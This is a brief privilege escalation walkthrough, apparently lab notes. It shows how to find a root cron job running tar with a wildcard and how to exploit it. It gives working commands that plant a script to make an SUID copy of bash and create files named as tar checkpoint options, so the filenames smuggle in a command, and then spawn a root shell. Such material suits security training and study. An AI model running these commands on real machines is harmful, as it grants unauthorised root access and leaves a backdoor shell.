**Detection**
Victim's  machine
- In command prompt type: 
```
cat /etc/crontab
```
- From the output, notice the script 
```
“/usr/local/bin/compress.sh”
```
- In command prompt type: 
```
cat /usr/local/bin/compress.sh
```

- From the output, notice the wildcard (*) used by ‘tar’.

**Exploitation**
Victim's machine
- In command prompt type:
```
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > /home/user/runme.sh
touch /home/user/--checkpoint=1
touch /home/user/--checkpoint-action=exec=sh\ runme.sh
```

- Wait 1 minute for the Bash script to execute.
- In command prompt type: 

```
/tmp/bash -p

id
```


More on this here:
https://www.hackingarticles.in/exploiting-wildcard-for-privilege-escalation/
